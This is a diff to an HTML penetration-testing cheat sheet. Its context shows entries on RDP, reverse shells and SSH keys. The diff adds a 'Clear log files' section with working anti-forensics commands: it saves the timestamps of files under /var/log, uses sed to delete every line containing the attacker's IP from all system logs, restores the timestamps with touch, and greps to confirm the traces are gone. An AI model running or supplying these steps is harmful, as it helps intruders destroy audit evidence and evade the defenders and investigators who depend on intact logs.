@@ -58,6 +58,7 @@ Topic contains:
         <li><a href='#n1.20'>Reverse shell</a></li>
 	<li><a href='#n1.21'>Git</a></li>
  	<li><a href='#n1.22'>SSH and id_rsa</a></li>
+  	<li><a href='#n1.23'>Clear log files</li>
 		
 <h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Remote Desktop Protocol (RDP): </ins></h3>
   <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
@@ -572,6 +573,19 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 		<li>chmod 600 id_rsa</li> to set right permissoon for use (It is required that your private key files are NOT accessible by others.)
 		<li>Connect</li>
 	</ul>
+ <h3 id='n1.23'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ins>Clear log files</ins></h3>
+ 	<ol>
+		<li>Check log file coplies (for example <code>ls -la /var/log/*.gz /var/log/*.1 /var/log/*.old</code>)</li>
+		<li>Save/check timestamps</li>
+			<pre><code>stat /var/log/* > /tmp/log_timestamps.txt</code></pre>
+ 		<li>Delete</li>
+			<pre><code>find /var/log -type f -exec sed -i '/YOUR_IP/d' {} \;</code></pre>
+		<li>Recover timestamps</li>
+			<pre><code>touch -r /var/log/auth.log.1 /var/log/auth.log</code></pre>
+			<p>Or use this script if save as second stage</p>
+		<li>Check result</li>
+			<pre><code>grep 'YOUR_IP' /var/log/*</code></pre>
+	</ol>
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
    
